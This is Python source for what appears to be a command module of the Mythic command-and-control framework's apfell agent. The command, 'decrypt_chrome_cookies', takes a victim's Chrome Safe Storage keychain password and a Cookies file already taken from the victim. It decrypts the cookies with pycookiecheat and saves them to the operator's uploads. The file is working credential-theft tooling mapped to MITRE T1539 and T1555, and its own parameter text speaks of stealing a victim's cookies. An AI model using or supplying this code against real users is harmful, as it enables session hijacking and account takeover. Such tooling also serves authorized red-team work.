from mythic_container.MythicCommandBase import *
import os
from mythic_container.MythicRPC import *
from apfell.pycookiecheat.pycookiecheat import crisp
import base64


class DecryptChromeCookiesArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                display_name="Chrome Safe Storage Password",
                name="password",
                type=ParameterType.String,
                description="Chrome safe storage password from the user's keychain",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=1
                    )
                ]
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                description="Victim's username from whom to steal the cookies",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=2
                    )
                ]
            ),
            CommandParameter(
                name="file_id",
                type=ParameterType.String,
                description="File ID for the Cookie file to parse",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=3
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class DecryptChromeCookiesCommand(CommandBase):
    cmd = "decrypt_chrome_cookies"
    needs_admin = True
    help_cmd = "decrypt_chrome_cookies -password \"chrome safe storage password\" -username {username}"
    description = "Uses the chrome safe storage password to decrypts the cookies that were downloaded for this user"
    version = 1
    supported_ui_features = [""]
    author = "@antman"
    parameters = []
    attackmapping = ["T1539", "T1555"]
    script_only = True
    argument_class = DecryptChromeCookiesArguments

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        ## write the cookies file to a new file on disk
        getCookiesResp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=taskData.args.get_arg("file_id"),
        ))
        if not getCookiesResp.Success:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=f"Encountered an error attempting to get downloaded file: {getCookiesResp.Error}".encode()
            ))
            remove_temp_files()
            response.TaskStatus = "Error: Failed to get cookies file"
            response.Success = False
            return response

        try:
            f = open("tmp_Cookies", "wb")
            f.write(getCookiesResp.Content)
            f.close()
        except Exception as e:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=f"Encountered an error attempting to write cookies to a file: {e}".encode()
            ))
            remove_temp_files()
            response.TaskStatus = "Error: Failed to get cookies file"
            response.Success = False
            return response
        cookies_output_file = os.path.abspath(self.agent_code_path / '..' / '..' /'cookies.json')
        cookies_file_path = os.path.abspath(self.agent_code_path / '..' / '..' /'tmp_Cookies')
        cookie_args = {"cookies_file": cookies_file_path,
                       "key": taskData.args.get_arg("password"),
                       "output": cookies_output_file}

        ## Decrypt Cookies file
        try:
            crisp(cookie_args)
            if os.path.isfile(cookies_output_file):
                if os.path.getsize(cookies_output_file) != 0:

                    json_file = open(cookies_output_file, "r")
                    json_load = json.load(json_file)
                    cookie_dump = json.dumps(json_load, indent=4)
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=taskData.Task.ID,
                        Response=f"[*] Cookies Decrypted:\n{cookie_dump}".encode()
                    ))
                    json_file.close()
                    cookie_file_save_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                        TaskID=taskData.Task.ID,
                        DeleteAfterFetch=False,
                        Filename="cookies.json",
                        Comment=f"{taskData.args.get_arg('username')}'s Decrypted Cookies'",
                        FileContents=cookie_dump.encode()
                    ))
                    if cookie_file_save_resp.Success:
                        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                            TaskID=taskData.Task.ID,
                            Response=f"\n[+] cookies.json saved to uploads".encode()
                        ))
                    else:
                        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                            TaskID=taskData.Task.ID,
                            Response=f"\n[-] Failed to save cookies.json: {cookie_file_save_resp.Error}".encode()
                        ))
                else:
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=taskData.Task.ID,
                        Response=f"[-] No cookies found in Cookies file".encode()
                    ))
            else:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=f"[-] Failed to process Cookies file".encode()
                ))
                remove_temp_files()
                response.TaskStatus = "Error: Failed to decrypt cookies"
                response.Success = False
                return response

        except Exception as e:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=f"[-] PyCookieCheat script failed with error: {e}".encode()
            ))
            remove_temp_files()
            response.TaskStatus = "Error: Failed to decrypt cookies - PyCookieCheat"
            response.Success = False
            return response
        # Remove the Cookies file from disk
        remove_temp_files()
        return response


def remove_temp_files():
    try:
        if os.path.isfile('tmp_Cookies'):
            os.remove('tmp_Cookies')
    except Exception as e:
        raise Exception("Failed to remove tmp_Cookies file")
    try:
        if os.path.isfile('cookies.json'):
            os.remove('cookies.json')
    except Exception as e:
        raise Exception("Failed to remove apfell/mythic/cookies.json file")
    try:
        if os.path.isfile('tmp_login.keychain-db'):
            os.remove('tmp_login.keychain-db')
    except Exception as e:
        raise Exception("Failed to remove apfell/mythic/tmp_login.keychain-db")
